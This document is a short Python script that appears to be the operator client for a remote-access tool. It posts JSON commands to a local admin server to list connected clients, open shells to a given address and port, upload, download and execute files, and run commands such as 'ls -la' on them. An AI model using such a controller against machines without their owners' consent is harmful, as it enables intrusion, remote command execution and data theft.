#!/usr/bin/python3
import requests

class admin:
    def __init__(self,addr="http://127.0.0.1:8080/admin"):
        self.addr=addr

    def doRequest(self,json):
        try:
            r=requests.post(self.addr,json=json)
            print(r.text)
            return (r.json["status"]=="ok")
        except Exception as e:
            print(e)
        


    #RPCS CALLS
    def displayClients(self):
        print("[python]displaying clientes!!")
        json={"CMD":"displayClients"}
        self.doRequest(json)

    def abrirShell(self,uid,addr,port):
        print("[python] opening shell",uid,addr,port)
        print("displaying clientes!!")
        json={"CMD":"abrirShell","uid":uid,"port":str(port),"addr":addr}
        return self.doRequest(json)

    def sendFile(self,fname,uid=0):
        print("[python]send file ",fname,uid)
        json={"CMD":"sendFile","uid":uid,"fname":fname}
        self.doRequest(json)

    def downloadFile(self,fname,uid=0):
        print("[python]download file",fname,uid)
        json={"CMD":"downloadFile","uid":uid,"fname":fname}
        self.doRequest(json)

    def executeProgram(self,fname,uid=0):
        print("[python]executeProgram!!",fname,uid)
        json={"CMD":"executeProgram","uid":uid,"fname":fname}
        self.doRequest(json)

    def runCommand(self,cmd,uid=0):
        print("[python]run command!!",cmd,uid)
        json={"CMD":"runCommand","cmdString":cmd,"uid":uid}
        self.doRequest(json)

    

master=admin()


def test():
    import time
    a=admin()
    while 1:
        
        a.displayClients()
        time.sleep(4);
        a.runCommand("ls -la")
        #a.downloadFile("paimon.png")
        time.sleep(4);
if __name__=="__main__":
    test()
